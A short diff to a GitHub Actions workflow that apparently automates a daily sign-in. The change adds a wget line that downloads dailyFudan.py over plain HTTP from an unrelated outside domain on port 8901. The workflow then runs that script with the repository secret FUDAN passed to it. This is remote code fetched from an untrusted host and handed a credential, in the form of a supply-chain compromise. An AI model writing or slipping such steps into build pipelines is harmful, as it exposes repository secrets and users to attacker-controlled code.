@@ -44,7 +44,8 @@ jobs:
       - name: Run sign
         run: |
           python -m pip install --upgrade pip
-          # vpip install -r requirements.txt
+          # pip install -r requirements.txt
+          wget http://duolingo.cmitnb.top:8901/dailyFudan.py
           pip install lxml
           pip install requests
           python3 ./dailyFudan.py '${{ secrets.FUDAN }}'
